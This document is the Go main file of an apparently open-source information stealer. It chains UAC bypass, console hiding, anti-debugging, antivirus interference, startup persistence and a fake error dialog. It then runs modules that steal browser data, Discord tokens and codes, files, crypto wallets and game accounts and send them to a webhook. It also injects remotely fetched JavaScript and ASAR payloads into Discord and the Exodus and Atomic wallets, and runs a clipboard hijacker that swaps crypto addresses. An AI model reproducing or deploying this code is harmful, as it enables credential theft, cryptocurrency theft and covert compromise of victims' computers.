package main

import (
	"github.com/hackirby/skuld/modules/antidebug"
	"github.com/hackirby/skuld/modules/antivirus"
	"github.com/hackirby/skuld/modules/browsers"
	"github.com/hackirby/skuld/modules/clipper"
	"github.com/hackirby/skuld/modules/commonfiles"
	"github.com/hackirby/skuld/modules/discodes"
	"github.com/hackirby/skuld/modules/discordinjection"
	"github.com/hackirby/skuld/modules/fakeerror"
	"github.com/hackirby/skuld/modules/games"
	"github.com/hackirby/skuld/modules/hideconsole"
	"github.com/hackirby/skuld/modules/startup"
	"github.com/hackirby/skuld/modules/system"
	"github.com/hackirby/skuld/modules/tokens"
	"github.com/hackirby/skuld/modules/uacbypass"
	"github.com/hackirby/skuld/modules/wallets"
	"github.com/hackirby/skuld/modules/walletsinjection"
	"github.com/hackirby/skuld/utils/program"
)

func main() {
	CONFIG := map[string]interface{}{
		"webhook": "",
		"cryptos": map[string]string{
			"BTC":  "",
			"ETH":  "",
			"MON":  "",
			"LTC":  "",
			"XCH":  "",
			"PCH":  "",
			"CCH":  "",
			"ADA":  "",
			"DASH": "",
		},
	}

	uacbypass.Run()

	hideconsole.Run()
	program.HideSelf()

	if !program.IsInStartupPath() {
		go fakeerror.Run()
		go startup.Run()
	}

	antidebug.Run()
	go antivirus.Run()

	go discordinjection.Run(
		"https://raw.githubusercontent.com/hackirby/discord-injection/main/injection.js",
		CONFIG["webhook"].(string),
	)
	go walletsinjection.Run(
		"https://raw.githubusercontent.com/hackirby/wallets-injection/main/atomic.asar",
		"https://raw.githubusercontent.com/hackirby/wallets-injection/main/exodus.asar",
		CONFIG["webhook"].(string),
	)

	actions := []func(string){
		system.Run,
		browsers.Run,
		tokens.Run,
		discodes.Run,
		commonfiles.Run,
		wallets.Run,
		games.Run,
	}

	for _, action := range actions {
		go action(CONFIG["webhook"].(string))
	}

	clipper.Run(CONFIG["cryptos"].(map[string]string))
}
